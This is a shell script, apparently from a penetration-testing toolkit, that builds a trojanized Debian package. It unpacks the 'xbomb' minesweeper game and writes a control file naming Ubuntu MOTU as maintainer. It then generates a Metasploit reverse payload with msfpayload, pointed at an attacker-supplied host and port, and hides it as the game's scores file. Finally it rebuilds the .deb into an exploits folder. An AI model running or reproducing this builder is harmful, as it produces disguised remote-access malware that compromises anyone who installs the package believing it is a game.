

mkdir /tmp/evil
dir=$(pwd)
cp $dir/cmd/debian/xbomb_2.2a-2_amd64.deb /tmp/evil

cd /tmp/evil/

dpkg -x xbomb_2.2a-2_amd64.deb work

mkdir work/DEBIAN
cd work/DEBIAN
# making control file
      echo "[*] [building]: control and postinst files...";
sleep 1
 echo Package: xbomb > control
      echo Version: 0.90-1 >> control
      echo Section: Games and Amusement >> control
      echo Priority: optional >> control
      echo Architecture: i386 >> control
      echo Maintainer: Ubuntu MOTU Developers [ubuntu-motu@lists.ubuntu.com] >> control
      echo Description: a text-based minesweeper game >> control

      # copy file postinst to working directory
      cp $dir/cmd/debian/postinst1 /tmp/evil/work/DEBIAN/postinst
      cd /tmp/evil/work/DEBIAN
      chmod 755 postinst
      chmod +x control



  echo "[*] [please wait]: building the payload... ";
   msfpayload $1 LHOST=$2 LPORT=$3 X > /tmp/evil/work/usr/games/xbomb_scores

      # building package.deb with all files
      sleep 2
      dpkg-deb --build /tmp/evil/work > /dev/null 2>&1
      sleep 7
      mv /tmp/evil/work.deb $dir/exploits/xbomb.deb


      # set permissions to file
      cd $dir/exploits/
      chown $4 xbomb.deb
      chmod 755 xbomb.deb
    rm -r /tmp/evil

